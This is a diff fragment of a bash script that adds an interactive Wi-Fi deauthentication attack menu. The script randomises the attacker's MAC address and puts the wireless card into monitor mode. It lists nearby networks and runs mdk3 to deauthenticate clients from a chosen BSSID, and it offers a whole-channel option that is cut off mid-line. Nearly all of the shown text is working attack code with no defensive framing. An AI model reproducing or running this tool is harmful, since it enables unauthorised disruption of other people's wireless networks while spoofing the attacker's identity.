@@ -56,4 +56,53 @@ function changeMAC() {
     ifconfig "$WI" down
     iwconfig "$WI" mode monitor
     macchanger -r "$WI"
-    ifconfig "$WI"
+    ifconfig "$WI" up
+}
+
+title
+echo -e "$BOLD_CYAN"
+echo " Choose an option:"
+echo " "
+echo -e "$BOLD_BLUE 1.$BOLD_WHITE Deauth a specific BSSID"
+echo -e "$BOLD_BLUE 2.$BOLD_WHITE Deauth a whole channel"
+echo " "
+echo -n -e "$BOLD_WHITE > "
+read CHOICE
+clear
+
+if [ "$CHOICE" = "1" ]; then
+    title
+    echo -e "$NO_COLOR"
+    nmcli dev wifi
+    echo " "
+    echo -e -n "$BOLD_CYAN"
+    echo -n " Type the target BSSID > "
+    echo -e -n "$BOLD_WHITE"
+    read BSSID
+    clear
+    title
+    echo " "
+    getIFCARD
+    read WI
+    echo " "
+    echo -e "$BOLD_GREEN"
+    echo "Starting the attack... Press CTRL+C to stop the attack."
+    changeMAC
+    trap coolexit SIGINT
+    mdk3 "$WI" d -t "$BSSID"
+elif [ "$CHOICE" = "2" ]; then
+    title
+    echo -e "$NO_COLOR"
+    nmcli dev wifi
+    echo " "
+    echo -e -n "$BOLD_CYAN"
+    echo -n " Type the target channel > "
+    echo -e -n "$BOLD_WHITE"
+    read CH
+    clear
+    title
+    echo " "
+    getIFCARD
+    read WI
+    echo " "
+    echo -e
